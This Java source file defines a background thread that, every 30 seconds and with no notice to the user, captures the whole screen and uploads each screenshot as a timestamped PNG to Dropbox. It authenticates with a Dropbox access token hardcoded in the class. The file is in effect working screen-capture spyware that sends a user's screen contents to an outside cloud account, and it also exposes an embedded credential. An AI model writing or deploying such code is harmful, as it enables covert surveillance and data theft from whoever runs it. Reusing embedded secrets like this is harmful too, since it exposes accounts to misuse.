import com.dropbox.core.DbxException;
import com.dropbox.core.DbxRequestConfig;
import com.dropbox.core.v2.DbxClientV2;
import com.dropbox.core.v2.files.FileMetadata;

import javax.imageio.ImageIO;
import java.awt.*;
import java.awt.image.BufferedImage;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.text.SimpleDateFormat;
import java.util.Date;

public class ProgramThread implements Runnable {

    private final String ACCESS_TOKEN = "PU3MBE8r8hAAAAAAAAAAE5AIzALvVjmbIazR4Y2agZt9HU17xjBBGZJBfZWTIuiV";


    private DbxRequestConfig config = DbxRequestConfig.newBuilder("dropbox/java-tutorial").build();
    private DbxClientV2 client = new DbxClientV2(config, ACCESS_TOKEN);

    private String filename;

    @Override
    public void run() {

        while (true){

            SimpleDateFormat dateFormat = new SimpleDateFormat("yyyyMMdd_HHmmss");

            Date date = new Date();

            try {

                long startTime = System.currentTimeMillis();

                BufferedImage image = new Robot().createScreenCapture(new Rectangle(Toolkit.getDefaultToolkit().getScreenSize()));

                filename = dateFormat.format(date);

                ByteArrayOutputStream os = new ByteArrayOutputStream();

                ImageIO.write(image, "png", os);

                InputStream in = new ByteArrayInputStream(os.toByteArray());

                FileMetadata metadata = client.files().uploadBuilder("/" + filename + ".png")
                        .uploadAndFinish(in);

                System.out.println(filename);

                long time = System.currentTimeMillis() - startTime;

                System.out.println(time);

                Thread.sleep(30000 - time);

            } catch (AWTException | IOException | DbxException | InterruptedException e) {
                e.printStackTrace();
            }

        }

    }

}
